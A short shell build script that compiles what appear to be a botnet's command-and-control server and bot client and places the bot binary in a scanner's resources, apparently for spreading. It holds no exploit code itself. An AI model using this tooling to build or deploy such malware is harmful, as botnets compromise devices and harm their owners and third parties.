gcc CNC/*.c -o cnc.bin -Wall -g -DDEBUG  `mysql_config --cflags --libs`;
gcc -pthread --std=c99 BOT/*.c -o bot.bin -Wall -g -DDEBUG;

cp ./bot.bin ./scanner/resources/bot2.bin